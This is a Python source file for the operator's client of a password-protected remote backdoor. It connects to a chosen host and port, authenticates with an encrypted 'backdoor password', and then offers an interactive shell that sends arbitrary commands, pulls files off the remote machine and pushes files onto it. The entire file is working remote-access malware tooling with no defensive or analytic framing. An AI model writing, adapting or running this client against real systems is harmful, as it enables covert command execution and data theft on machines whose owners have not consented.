import socket
import base64
import hashlib
from cryptography.fernet import Fernet

def main():
    host = input("Enter the host IP: ")
    port = int(input("Enter the port: "))
    password = input("Enter the backdoor password: ")

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))

    # Password authentication
    encryptor = Fernet(base64.urlsafe_b64encode(hashlib.sha256(password.encode()).digest()))
    prompt = client.recv(1024).decode()
    print(prompt, end="")

    encrypted_password = encryptor.encrypt(password.encode())
    client.send(encrypted_password)

    auth_response = client.recv(1024)
    try:
        decrypted_response = encryptor.decrypt(auth_response).decode()
        print(decrypted_response, end="")
        if "failed" in decrypted_response:
            return
    except Exception as e:
        print(f"Authentication error: {e}")
        return

    while True:
        command = input("> ")
        if command.lower() == "exit":
            break

        client.send(encryptor.encrypt(command.encode()))

        if command.startswith("download "):
            data_len = int.from_bytes(client.recv(4), 'big')
            if data_len > 0:
                data = client.recv(data_len)
                filepath = command.split(" ", 1)[1]
                with open(filepath, 'wb') as f:
                    f.write(data)
                print(f"File '{filepath}' downloaded successfully.")
            else:
                print("File not found on remote machine.")
        elif command.startswith("upload "):
            filepath = command.split(" ", 1)[1]
            try:
                with open(filepath, 'rb') as f:
                    data = f.read()
                client.send(len(data).to_bytes(4, 'big'))
                client.sendall(data)
                response = client.recv(1024)
                print(encryptor.decrypt(response).decode())
            except FileNotFoundError:
                print(f"File not found: {filepath}")
        else:
            response = client.recv(4096).decode(errors='ignore')
            print(response)

    client.close()

if __name__ == "__main__":
    main()